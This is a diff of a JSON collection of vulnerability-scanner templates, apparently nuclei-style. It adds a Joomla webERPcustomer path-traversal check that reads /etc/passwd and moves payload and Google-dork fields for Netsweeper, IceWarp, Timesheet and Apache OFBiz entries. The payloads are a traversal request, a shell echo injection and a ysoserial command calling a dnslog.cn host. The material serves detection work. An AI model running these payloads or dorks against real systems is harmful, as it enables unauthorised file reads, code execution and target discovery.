@@ -1127,6 +1127,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1315",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in weberpcustomer.php in the webERPcustomer (com_weberpcustomer) component 1.2.1 and 1.x before 1.06.02 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component webERPcustomer - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/11999",
+          "https://www.cvedetails.com/cve/CVE-2010-1315"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_weberpcustomer&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1345",
       "info": {
         "author": "daffainfo",
@@ -14510,9 +14547,6 @@
     {
       "id": "CVE-2019-1010287",
       "info": {
-        "additional-fields": {
-          "google-dork": "inurl:\"/timesheet/login.php\""
-        },
         "author": "pikpikcu",
         "classification": {
           "cve-id": "CVE-2019-1010287",
@@ -14521,6 +14555,9 @@
           "cwe-id": "CWE-79"
         },
         "description": "Timesheet Next Gen 1.5.3 and earlier is affected by: Cross Site Scripting (XSS). The impact is: Allows an attacker to execute arbitrary HTML and JavaScript code via a \"redirect\" parameter. The component is: Web login form: login.php, lines 40 and 54. The attack vector is: reflected XSS, victim may click the malicious url.",
+        "metadata": {
+          "google-dork": "inurl:\"/timesheet/login.php\""
+        },
         "name": "Timesheet 1.5.3 - Cross Site Scripting",
         "reference": [
           "https://nvd.nist.gov/vuln/detail/CVE-2019-1010287",
@@ -15016,9 +15053,6 @@
     {
       "id": "CVE-2019-12593",
       "info": {
-        "additional-fields": {
-          "google-dork": "Powered By IceWarp 10.4.4"
-        },
         "author": "pikpikcu",
         "classification": {
           "cve-id": "CVE-2019-12593",
@@ -15027,6 +15061,9 @@
           "cwe-id": "CWE-22"
         },
         "description": "IceWarp Mail Server through 10.4.4 is prone to a local file inclusion vulnerability via webmail/calendar/minimizer/index.php?style=..%5c directory traversal.",
+        "metadata": {
+          "google-dork": "Powered By IceWarp 10.4.4"
+        },
         "name": "IceWarp <=10.4.4 - Local File Inclusion",
         "reference": [
           "https://github.com/JameelNabbo/exploits/blob/master/IceWarp%20%3C%3D10.4.4%20local%20file%20include.txt",
@@ -19590,9 +19627,6 @@
     {
       "id": "CVE-2020-13167",
       "info": {
-        "additional-fields": {
-          "hex-payload": "echo \"bm9uZXhpc3RlbnQ=\" | base64 -d > /usr/local/netsweeper/webadmin/out"
-        },
         "author": "dwisiswant0",
         "classification": {
           "cve-id": "CVE-2020-13167",
@@ -19601,6 +19635,9 @@
           "cwe-id": "CWE-78"
         },
         "description": "Netsweeper through 6.4.3 allows unauthenticated remote code execution because webadmin/tools/unixlogin.php (with certain Referer headers) launches a command line with client-supplied parameters, and allows injection of shell metacharacters.",
+        "metadata": {
+          "hex-payload": "echo \"bm9uZXhpc3RlbnQ=\" | base64 -d > /usr/local/netsweeper/webadmin/out"
+        },
         "name": "Netsweeper WebAdmin unixlogin.php Python Code Injection",
         "reference": [
           "https://ssd-disclosure.com/ssd-advisory-netsweeper-preauth-rce/",
@@ -20075,9 +20112,6 @@
     {
       "id": "CVE-2020-14864",
       "info": {
-        "additional-fields": {
-          "cvss": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
-        },
         "author": "Ivo Palazzolo (@palaziv)",
         "classification": {
           "cve-id": "CVE-2020-14864",
@@ -28759,9 +28793,6 @@
     {
       "id": "CVE-2021-26295",
       "info": {
-        "additional-fields": {
-          "ysoserial-payload": "java -jar ysoserial-master-d367e379d9-1.jar URLDNS http://t53lq9.dnslog.cn | hex"
-        },
         "author": "madrobot",
         "classification": {
           "cve-id": "CVE-2021-26295",
@@ -28770,6 +28801,9 @@
           "cwe-id": "CWE-502"
         },
         "description": "Apache OFBiz has unsafe deserialization prior to 17.12.06. An unauthenticated attacker can use this vulnerability to successfully take over Apache OFBiz.",
+        "metadata": {
+          "ysoserial-payload": "java -jar ysoserial-master-d367e379d9-1.jar URLDNS http://t53lq9.dnslog.cn | hex"
+        },
         "name": "Apache OFBiz RMI deserializes Arbitrary Code Execution",
         "reference": [
           "https://github.com/yumusb/CVE-2021-26295-POC",
